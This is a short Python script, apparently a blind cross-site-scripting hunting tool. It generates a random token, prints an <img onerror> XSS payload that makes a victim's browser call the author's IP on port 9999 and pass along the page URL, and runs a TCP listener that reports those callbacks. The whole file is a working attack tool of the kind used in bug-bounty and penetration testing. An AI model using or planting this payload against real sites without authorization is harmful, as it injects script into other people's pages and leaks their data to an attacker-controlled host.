import socket
import sys
import random
import string
import datetime
import time
import socketserver
import emoji

import netifaces as ni
ni.ifaddresses('eth0')
IP = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
PORT = 9999


def listener(URI):
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socketserver.TCPServer.allow_reuse_address=True
        s.bind((IP, PORT))
        s.listen(10)
        conn, addr = s.accept()
        msg = str(conn.recv(1024),'utf8')
        if URI in msg:
            print(emoji.emojize("["+':fire:'+"]")+"Got a blind XSS with payload ending: "+URI)
            print(msg)
        else:
            print(emoji.emojize("["+':person_shrugging:'+"]")+"Nothing here")
        data = None
        conn.close()
        time.sleep(1)
    print('Exited!')


def create_payload():
    letters = string.ascii_lowercase
    URI=(''.join(random.choice(letters) for i in range(20)))
    # print ("Payload URI: "+URI)
    print (emoji.emojize("["+':thumbs_up:'+"]")+"XSS payload: <img src=x onerror=this.src=\"http://{0}:{1}/{2}?URL=\"+document.URL>".format(IP,PORT,URI))
    print (emoji.emojize("["+':crossed_fingers:'+"]")+"Listening for blind XSS...")
    listener(URI)

if __name__ == "__main__":
    create_payload()



'''
To dos
- DNS based connections instead of IP.
- Generate multiple payloads and listen for all incoming blind xss.
- Get the page URL where it gets executed
'''
